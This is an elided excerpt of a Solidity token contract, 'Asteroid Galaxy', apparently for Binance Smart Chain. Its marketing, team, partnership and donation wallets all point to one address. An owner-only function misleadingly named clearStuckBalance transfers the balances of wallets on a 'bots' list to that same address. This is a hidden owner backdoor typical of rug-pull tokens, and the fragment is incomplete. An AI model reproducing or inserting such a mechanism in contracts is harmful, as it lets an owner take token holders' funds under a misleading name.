...
/*
Telegram : https://t.me/bscasteroidgalaxy
*/
...
contract AsteroidGalaxy is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xAA58c0db23a3105080A57D10A6326f587e6C5d6f));
    address payable public _teamwallet =
        payable(address(0xAA58c0db23a3105080A57D10A6326f587e6C5d6f));
    address _partnershipswallet =
        payable(address(0xAA58c0db23a3105080A57D10A6326f587e6C5d6f));
    address private _donationAddress =
        0xAA58c0db23a3105080A57D10A6326f587e6C5d6f;

    string private _name = "Asteroid Galaxy";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0xAA58c0db23a3105080A57D10A6326f587e6C5d6f), amount);
        }
